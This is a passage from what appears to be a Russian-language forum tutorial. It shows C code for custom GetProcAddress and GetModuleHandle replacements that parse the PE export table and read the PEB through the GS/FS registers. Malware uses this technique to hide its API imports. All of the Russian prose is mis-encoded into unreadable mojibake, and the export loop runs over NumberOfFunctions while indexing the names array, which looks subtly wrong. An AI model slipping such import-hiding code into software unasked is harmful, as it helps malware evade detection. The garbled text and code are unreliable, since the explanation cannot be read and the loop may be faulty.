–ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –≤—ã—à–µ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç, —á—Ç–æ –∞–¥—Ä–µ—Å A_SHAUpdate —Ä–∞–≤–µ–Ω 0x00007FFD384D2D10 –∫–∞–∫ –≤ xdbg, —Ç–∞–∫ –∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ñ—É–Ω–∫—Ü–∏–∏ GetProcAddressReplacement. –û–¥–Ω–∞–∫–æ –æ–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ –ø–æ—Ä—è–¥–∫–æ–≤—ã–µ –Ω–æ–º–µ—Ä–∞ –¥–ª—è —Ñ—É–Ω–∫—Ü–∏–∏ –æ—Ç–ª–∏—á–∞—é—Ç—Å—è –∏–∑-–∑–∞ —Ç–æ–≥–æ, —á—Ç–æ –∑–∞–≥—Ä—É–∑—á–∏–∫ Windows –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç –Ω–æ–≤—ã–π –º–∞—Å—Å–∏–≤ –ø–æ—Ä—è–¥–∫–æ–≤—ã—Ö –Ω–æ–º–µ—Ä–æ–≤ –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
<b>–ö–æ–¥ GetProcAddressReplacement</b><br />
<br />
–ü–æ—Å–ª–µ–¥–Ω–∏–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–π –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–∏, - —ç—Ç–æ —Å–ø–æ—Å–æ–± —Å—Ä–∞–≤–Ω–µ–Ω–∏—è —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –∏–º–µ–Ω —Ñ—É–Ω–∫—Ü–∏–π —Å —Ü–µ–ª–µ–≤—ã–º –∏–º–µ–Ω–µ–º —Ñ—É–Ω–∫—Ü–∏–∏, lpApiName. –≠—Ç–æ –ª–µ–≥–∫–æ —Å–¥–µ–ª–∞—Ç—å —Å –ø–æ–º–æ—â—å—é strcmp. –ó–∞—Ç–µ–º, –Ω–∞–∫–æ–Ω–µ—Ü, –≤–µ—Ä–Ω–∏—Ç–µ –∞–¥—Ä–µ—Å —Ñ—É–Ω–∫—Ü–∏–∏ –ø—Ä–∏ —Å–æ–≤–ø–∞–¥–µ–Ω–∏–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName) {

    // –î–µ–ª–∞–µ–º —ç—Ç–æ, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å –ø—Ä–∏–≤–µ–¥–µ–Ω–∏—è –∫–∞–∂–¥—ã–π —Ä–∞–∑ –ø—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ &#039;hModule&#039;
    PBYTE pBase = (PBYTE)hModule;

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∑–∞–≥–æ–ª–æ–≤–∫–∞ DOS –∏ –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–ø–∏—Å–∏
    PIMAGE_DOS_HEADER    pImgDosHdr        = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤ NT –∏ –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–ø–∏—Å–∏
    PIMAGE_NT_HEADERS    pImgNtHdrs        = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);
    if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ–≥–æ –∑–∞–≥–æ–ª–æ–≤–∫–∞
    IMAGE_OPTIONAL_HEADER    ImgOptHdr    = pImgNtHdrs-&gt;OptionalHeader;

    // –ü–æ–ª—É—á–µ–Ω–∏–µ —Ç–∞–±–ª–∏—Ü—ã —ç–∫—Å–ø–æ—Ä—Ç–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) (pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // –ü–æ–ª—É—á–µ–Ω–∏–µ —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ –º–∞—Å—Å–∏–≤ –∏–º–µ–Ω —Ñ—É–Ω–∫—Ü–∏–π
    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);

    // –ü–æ–ª—É—á–µ–Ω–∏–µ —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ –º–∞—Å—Å–∏–≤ –∞–¥—Ä–µ—Å–æ–≤ —Ñ—É–Ω–∫—Ü–∏–π
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);

    // –ü–æ–ª—É—á–µ–Ω–∏–µ —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ –º–∞—Å—Å–∏–≤ –ø–æ—Ä—è–¥–∫–æ–≤—ã—Ö –Ω–æ–º–µ—Ä–æ–≤ —Ñ—É–Ω–∫—Ü–∏–∏
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);

    // –¶–∏–∫–ª –ø–æ –≤—Å–µ–º —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–º —Ñ—É–Ω–∫—Ü–∏—è–º
    for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++){

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–º–µ–Ω–∏ —Ñ—É–Ω–∫—Ü–∏–∏
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏ —á–µ—Ä–µ–∑ –µ–≥–æ –ø–æ—Ä—è–¥–∫–æ–≤—ã–π –Ω–æ–º–µ—Ä
        PVOID pFunctionAddress    = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        // –ü–æ–∏—Å–∫ —É–∫–∞–∑–∞–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏
        if (strcmp(lpApiName, pFunctionName) == 0){
            printf(&quot;[ %0.4d ] FOUND API -\t NAME: %s -\t ADDRESS: 0x%p  -\t ORDINAL: %d\n&quot;, i, pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
            return pFunctionAddress;
        }
    }

    return NULL;
}</code></pre>
	</div>
</div><br />
<b>–§–∏–Ω–∞–ª—å–Ω–∞—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è</b> <b>GetProcAddressReplacement </b><br />
<br />
–ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –Ω–∏–∂–µ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –æ–±–µ–∏—Ö —Ñ—É–Ω–∫—Ü–∏–π GetProcAddress –∏ GetProcAddressReplacement, –∏—â—É—â–∏—Ö –∞–¥—Ä–µ—Å NtAllocateVirtualMemory. –ö–∞–∫ –æ–∂–∏–¥–∞–ª–æ—Å—å, –æ–±–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞ —É–∫–∞–∑—ã–≤–∞—é—Ç –Ω–∞ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –∞–¥—Ä–µ—Å —Ñ—É–Ω–∫—Ü–∏–∏, –∏ –ø–æ—ç—Ç–æ–º—É —É—Å–ø–µ—à–Ω–æ –±—ã–ª–∞ —Å–æ–∑–¥–∞–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∞—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è GetProcAddress.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784788708.png"
		data-src="https://osint42.org/attachments/1746784788708-png.182/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784788708-png.182/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784788708.png"
			title="1746784788708.png"
			width="818" height="468" loading="lazy" />
	</div><br />
<br />
<b>–¢–µ–ø–µ—Ä—å –¥–∞–≤–∞–π—Ç–µ –ø–æ–ø—Ä–æ–±—É–µ–º —Ä–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é GetModuleHandle</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è GetModuleHandle –∏–∑–≤–ª–µ–∫–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –¥–ª—è —É–∫–∞–∑–∞–Ω–Ω–æ–π DLL. –§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –∫ DLL –∏–ª–∏ NULL, –µ—Å–ª–∏ DLL –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –≤ –≤—ã–∑—ã–≤–∞—é—â–µ–º –ø—Ä–æ—Ü–µ—Å—Å–µ.<br />
<br />
–í —ç—Ç–æ–º –º–æ–¥—É–ª–µ –±—É–¥–µ—Ç —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–∞ —Ñ—É–Ω–∫—Ü–∏—è, –∫–æ—Ç–æ—Ä–∞—è –∑–∞–º–µ–Ω–∏—Ç GetModuleHandle.<br />
<br />
–ü—Ä–æ—Ç–æ—Ç–∏–ø –Ω–æ–≤–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HMODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName){}</code></pre>
	</div>
</div><br />
<b>–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç GetModuleHandle</b><br />
<br />
–¢–∏–ø –¥–∞–Ω–Ω—ã—Ö HMODULE - —ç—Ç–æ –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –∑–∞–≥—Ä—É–∂–µ–Ω–Ω–æ–π DLL, –∫–æ—Ç–æ—Ä—ã–π —É–∫–∞–∑—ã–≤–∞–µ—Ç, –≥–¥–µ DLL —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–∞ –≤ –∞–¥—Ä–µ—Å–Ω–æ–º –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ –ø—Ä–æ—Ü–µ—Å—Å–∞. –°–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, —Ü–µ–ª—å —Ñ—É–Ω–∫—Ü–∏–∏-–∑–∞–º–µ–Ω–∏—Ç–µ–ª—è - –∏–∑–≤–ª–µ—á—å –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å —É–∫–∞–∑–∞–Ω–Ω–æ–π DLL.<br />
<br />
–ë–ª–æ–∫ –æ–∫—Ä—É–∂–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ (PEB) —Å–æ–¥–µ—Ä–∂–∏—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã—Ö DLL, –≤ —á–∞—Å—Ç–Ω–æ—Å—Ç–∏, —á–ª–µ–Ω PEB_LDR_DATA Ldr —Å—Ç—Ä—É–∫—Ç—É—Ä—ã PEB.<br />
<br />
–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –Ω–∞—á–∞–ª—å–Ω—ã–π —à–∞–≥ - –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —ç—Ç–æ–º—É —á–ª–µ–Ω—É —á–µ—Ä–µ–∑ —Å—Ç—Ä—É–∫—Ç—É—Ä—É PEB.<br />
<br />
<b>PEB –≤ 64-–±–∏—Ç–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–∞—Ö</b><br />
<br />
–ù–∞–ø–æ–º–Ω–∏–º, —á—Ç–æ —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É PEB –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —Å—Ç—Ä—É–∫—Ç—É—Ä–µ –±–ª–æ–∫–∞ –æ–∫—Ä—É–∂–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞ (TEB).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784806412.png"
		data-src="https://osint42.org/attachments/1746784806412-png.183/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784806412-png.183/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784806412.png"
			title="1746784806412.png"
			width="1085" height="100" loading="lazy" />
	</div><br />
<br />
–í 64-–±–∏—Ç–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–∞—Ö —Å–º–µ—â–µ–Ω–∏–µ –∫ —É–∫–∞–∑–∞—Ç–µ–ª—é —Å—Ç—Ä—É–∫—Ç—É—Ä—ã TEB —Ö—Ä–∞–Ω–∏—Ç—Å—è –≤ —Ä–µ–≥–∏—Å—Ç—Ä–µ GS. –°–ª–µ–¥—É—é—â–µ–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –∏–∑ x64dbg.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784813497.png"
		data-src="https://osint42.org/attachments/1746784813497-png.184/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784813497-png.184/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784813497.png"
			title="1746784813497.png"
			width="1378" height="132" loading="lazy" />
	</div><br />
<br />
<b>–ú–µ—Ç–æ–¥ 1: –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ PEB –≤ 64-–±–∏—Ç–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–∞—Ö</b><br />
<br />
–°—É—â–µ—Å—Ç–≤—É—é—Ç –¥–≤–∞ —Ä–∞–∑–Ω—ã—Ö —Å–ø–æ—Å–æ–±–∞ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è PEB. –ü–µ—Ä–≤—ã–π –º–µ—Ç–æ–¥ –≤–∫–ª—é—á–∞–µ—Ç –≤ —Å–µ–±—è –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã TEB, –∞ –∑–∞—Ç–µ–º –ø–æ–ª—É—á–µ–Ω–∏–µ —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ PEB. –≠—Ç–æ—Ç –ø–æ–¥—Ö–æ–¥ –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Å –ø–æ–º–æ—â—å—é –º–∞–∫—Ä–æ—Å–∞ __readgsqword(0x30) –≤ Visual Studio, –∫–æ—Ç–æ—Ä—ã–π —Å—á–∏—Ç—ã–≤–∞–µ—Ç 0x30 –±–∞–π—Ç –∏–∑ —Ä–µ–≥–∏—Å—Ç—Ä–∞ GS, —á—Ç–æ–±—ã –¥–æ—Å—Ç–∏—á—å —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É TEB.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ú–µ—Ç–æ–¥ 1
PTEB pTeb = (PTEB)__readgsqword(0x30);
PPEB pPeb = (PPEB)pTeb-&gt;ProcessEnvironmentBlock;</code></pre>
	</div>
</div><br />
<b>–ú–µ—Ç–æ–¥ 2: –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ PEB –≤ 64-–±–∏—Ç–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–∞—Ö </b><br />
<br />
–°–ª–µ–¥—É—é—â–∏–π –º–µ—Ç–æ–¥ –∏–∑–≤–ª–µ–∫–∞–µ—Ç —Å—Ç—Ä—É–∫—Ç—É—Ä—É PEB –Ω–∞–ø—Ä—è–º—É—é, –ø—Ä–æ–ø—É—Å–∫–∞—è —Å—Ç—Ä—É–∫—Ç—É—Ä—É TEB, –∏—Å–ø–æ–ª—å–∑—É—è –º–∞–∫—Ä–æ—Å __readgsqword(0x60) –≤ Visual Studio, –∫–æ—Ç–æ—Ä—ã–π —Å—á–∏—Ç—ã–≤–∞–µ—Ç 0x60 –±–∞–π—Ç –∏–∑ —Ä–µ–≥–∏—Å—Ç—Ä–∞ GS.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ú–µ—Ç–æ–¥ 2
PPEB pPeb2 = (PPEB)(__readgsqword(0x60));</code></pre>
	</div>
</div><br />
–≠—Ç–æ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å, –ø–æ—Ç–æ–º—É —á—Ç–æ —ç–ª–µ–º–µ–Ω—Ç ProcessEnvironmentBlock –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –Ω–∞ 0x60 (hex) –∏–ª–∏ 96 –±–∞–π—Ç–∞—Ö –æ—Ç –Ω–∞—á–∞–ª–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã TEB.<br />
<br />
<b>–ú–µ—Ç–æ–¥ 1: –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ PEB –≤ 32-–±–∏—Ç–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–∞—Ö.</b><br />
<br />
–¢–∞–∫ –∂–µ, –∫–∞–∫ –∏ –≤ 64-–±–∏—Ç–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–∞—Ö, —Å—É—â–µ—Å—Ç–≤—É—é—Ç –¥–≤–∞ —Å–ø–æ—Å–æ–±–∞ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è PEB.<br />
<br />
–ü–µ—Ä–≤—ã–π –º–µ—Ç–æ–¥ –≤–∫–ª—é—á–∞–µ—Ç –≤ —Å–µ–±—è –ø–æ–ª—É—á–µ–Ω–∏–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã TEB, –∞ –∑–∞—Ç–µ–º –ø–æ–ª—É—á–µ–Ω–∏–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã PEB —Å –ø–æ–º–æ—â—å—é –º–∞–∫—Ä–æ—Å–∞ __readfsdword(0x18) –≤ Visual Studio, –∫–æ—Ç–æ—Ä—ã–π —Å—á–∏—Ç—ã–≤–∞–µ—Ç 0x18 –±–∞–π—Ç –∏–∑ —Ä–µ–≥–∏—Å—Ç—Ä–∞ FS.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ú–µ—Ç–æ–¥ 1
PTEB pTeb = (PTEB)__readfsdword(0x18);
PPEB pPeb = (PPEB)pTeb-&gt;ProcessEnvironmentBlock;</code></pre>
	</div>
</div><br />
<b>–ú–µ—Ç–æ–¥ 2: –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ PEB –≤ 32-–±–∏—Ç–Ω—ã—Ö</b> <b>—Å–∏—Å—Ç–µ–º–∞—Ö</b><br />
<br />
–í—Ç–æ—Ä–æ–π –º–µ—Ç–æ–¥ –ø–æ–ª—É—á–∞–µ—Ç PEB –Ω–∞–ø—Ä—è–º—É—é, –ø—Ä–æ–ø—É—Å–∫–∞—è —Å—Ç—Ä—É–∫—Ç—É—Ä—É TEB, –∏—Å–ø–æ–ª—å–∑—É—è –º–∞–∫—Ä–æ—Å __readfsdword(0x30) –≤ Visual Studio, –∫–æ—Ç–æ—Ä—ã–π —Å—á–∏—Ç—ã–≤–∞–µ—Ç 0x30 –±–∞–π—Ç –∏–∑ —Ä–µ–≥–∏—Å—Ç—Ä–∞ FS.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// –ú–µ—Ç–æ–¥ 2
PPEB pPeb2 = (PPEB)(__readfsdword(0x30));</code></pre>
	</div>
</div><br />
0x30 (hex) —ç—Ç–æ 48 –±–∞–π—Ç, –∫–æ—Ç–æ—Ä—ã–µ —è–≤–ª—è—é—Ç—Å—è —Å–º–µ—â–µ–Ω–∏–µ–º —ç–ª–µ–º–µ–Ω—Ç–∞ ProcessEnvironmentBlock –æ—Ç 32-–±–∏—Ç–Ω–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã TEB. –¢–∏–ø –¥–∞–Ω–Ω—ã—Ö PVOID —Å–æ—Å—Ç–∞–≤–ª—è–µ—Ç 4 –±–∞–π—Ç–∞ –≤ 32-–±–∏—Ç–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–∞—Ö.<br />
<br />
<b>–ü–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ DLL</b><br />
<br />
–ü–æ—Å–ª–µ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã PEB —Å–ª–µ–¥—É—é—â–∏–π —à–∞–≥ - –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —á–ª–µ–Ω—É PEB_LDR_DATA Ldr. –ù–∞–ø–æ–º–Ω–∏–º, —á—Ç–æ —ç—Ç–æ—Ç —á–ª–µ–Ω —Å–æ–¥–µ—Ä–∂–∏—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã—Ö DLL –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ.<br />
<br />
<b>–°—Ç—Ä—É–∫—Ç—É—Ä–∞ PEB_LDR_DATA</b><br />
<br />
–°—Ç—Ä—É–∫—Ç—É—Ä–∞ PEB_LDR_DATA –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–∏–∂–µ. –í–∞–∂–Ω—ã–º —á–ª–µ–Ω–æ–º —ç—Ç–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã —è–≤–ª—è–µ—Ç—Å—è LIST_ENTRY InMemoryOrderModuleList.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _PEB_LDR_DATA {
BYTE Reserved1[8];
PVOID Reserved2[3];
LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;</code></pre>
	</div>
</div><br />
<b>–°—Ç—Ä—É–∫—Ç—É—Ä–∞ LIST_ENTRY</b><br />
–°—Ç—Ä—É–∫—Ç—É—Ä–∞ LIST_ENTRY, –ø–æ–∫–∞–∑–∞–Ω–Ω–∞—è –Ω–∏–∂–µ, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –¥–≤—É—Å–≤—è–∑–Ω—ã–π —Å–ø–∏—Å–æ–∫, –∫–æ—Ç–æ—Ä—ã–π –ø–æ —Å—É—Ç–∏ –∞–Ω–∞–ª–æ–≥–∏—á–µ–Ω –º–∞—Å—Å–∏–≤–∞–º, –Ω–æ —É–ø—Ä–æ—â–∞–µ—Ç –¥–æ—Å—Ç—É–ø –∫ —Å–æ—Å–µ–¥–Ω–∏–º —ç–ª–µ–º–µ–Ω—Ç–∞–º.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _LIST_ENTRY {
struct _LIST_ENTRY *Flink;
struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</code></pre>
	</div>
</div><br />
–î–≤—É—Å–≤—è–∑–Ω—ã–µ —Å–ø–∏—Å–∫–∏ –∏—Å–ø–æ–ª—å–∑—É—é—Ç —ç–ª–µ–º–µ–Ω—Ç—ã Flink –∏ Blink –≤ –∫–∞—á–µ—Å—Ç–≤–µ —É–∫–∞–∑–∞—Ç–µ–ª–µ–π –Ω–∞ –Ω–∞—á–∞–ª–æ –∏ –∫–æ–Ω–µ—Ü —Å–ø–∏—Å–∫–∞ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ. –≠—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ Flink —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ —Å–ª–µ–¥—É—é—â–∏–π —É–∑–µ–ª –≤ —Å–ø–∏—Å–∫–µ, —Ç–æ–≥–¥–∞ –∫–∞–∫ —ç–ª–µ–º–µ–Ω—Ç Blink —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ –ø—Ä–µ–¥—ã–¥—É—â–∏–π —É–∑–µ–ª –≤ —Å–ø–∏—Å–∫–µ. –≠—Ç–∏ —É–∫–∞–∑–∞—Ç–µ–ª–∏ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏—è –ø–æ —Å–≤—è–∑–∞–Ω–Ω–æ–º—É —Å–ø–∏—Å–∫—É –≤ –æ–±–æ–∏—Ö –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è—Ö. –ó–Ω–∞—è —ç—Ç–æ, —á—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ —ç—Ç–æ–≥–æ —Å–ø–∏—Å–∫–∞, —Å–ª–µ–¥—É–µ—Ç –Ω–∞—á–∞—Ç—å —Å –¥–æ—Å—Ç—É–ø–∞ –∫ –µ–≥–æ –ø–µ—Ä–≤–æ–º—É —ç–ª–µ–º–µ–Ω—Ç—É, InMemoryOrderModuleList.Flink.<br />
<br />
